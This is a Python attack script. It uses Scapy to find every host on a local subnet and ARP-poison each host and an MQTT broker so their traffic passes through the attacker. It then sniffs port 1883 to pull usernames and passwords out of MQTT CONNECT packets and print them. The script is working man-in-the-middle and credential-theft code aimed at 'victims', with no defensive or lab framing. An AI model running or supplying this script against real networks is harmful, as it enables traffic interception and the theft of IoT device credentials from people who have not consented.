#!/usr/bin/env python3
import os
import time
import struct
from threading import Thread
from scapy.all import (
    Ether, ARP, send, srp, sniff, Raw, TCP, get_if_addr
)

# ─────────────────────────────────────────────
BROKER_IP = "192.168.10.1"
INTERFACE = "eth0"
SUBNET = ".".join(BROKER_IP.split(".")[:3]) + ".0/24"

# ─────────────────────────────────────────────
def get_all_devices(cidr=SUBNET):
    print("[*] Discovering live devices…")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr)
    answered, _ = srp(pkt, timeout=2, verbose=False)
    return [rcv.psrc for snd, rcv in answered]

def get_mac(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(pkt, timeout=2, verbose=False)
    for _, rcv in answered:
        return rcv[Ether].src
    return None

# ─────────────────────────────────────────────
def arp_spoof_all(victims, broker_ip, mac_map, broker_mac):
    print("[*] Starting ARP spoof loop...")
    def spoof():
        while True:
            for victim_ip, victim_mac in mac_map.items():
                if not victim_mac:
                    continue
                send(Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=broker_ip, hwdst=victim_mac), verbose=False)
                send(Ether(dst=broker_mac)/ARP(op=2, pdst=broker_ip, psrc=victim_ip, hwdst=broker_mac), verbose=False)
            time.sleep(2)
    Thread(target=spoof, daemon=True).start()

# ─────────────────────────────────────────────
def extract_credentials(pkt):
    if Raw in pkt and pkt[TCP].dport == 1883:
        payload = pkt[Raw].load
        if payload[0] == 0x10:  # CONNECT packet
            try:
                i = 2
                proto_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2 + proto_len + 4  # skip proto name, ver, flags, keepalive
                client_id_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2 + client_id_len
                username_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2
                username = payload[i:i+username_len].decode(errors="ignore")
                i += username_len
                password_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2
                password = payload[i:i+password_len].decode(errors="ignore")
                print(f"[+] MQTT Credentials Found → Username: '{username}' | Password: '{password}'")
            except Exception:
                pass

def sniff_credentials(interface=INTERFACE):
    print("[*] Sniffing MQTT credentials on port 1883…")
    sniff(iface=interface, filter="tcp port 1883", prn=extract_credentials, store=0)

# ─────────────────────────────────────────────
if __name__ == "__main__":
    print(f"[*] Broker: {BROKER_IP}")
    print(f"[*] Subnet: {SUBNET}")

    victims = get_all_devices()
    victims = [v for v in victims if v != BROKER_IP]
    print(f"[+] Victims: {', '.join(victims)}")

    print("[*] Caching MAC addresses…")
    mac_map = {ip: get_mac(ip) for ip in victims}
    broker_mac = get_mac(BROKER_IP)

    print(f"[+] Broker MAC: {broker_mac}")
    print("[+] Victim MACs:")
    for ip, mac in mac_map.items():
        print(f"    {ip} → {mac if mac else '--'}")

    arp_spoof_all(victims, BROKER_IP, mac_map, broker_mac)
    sniff_credentials()

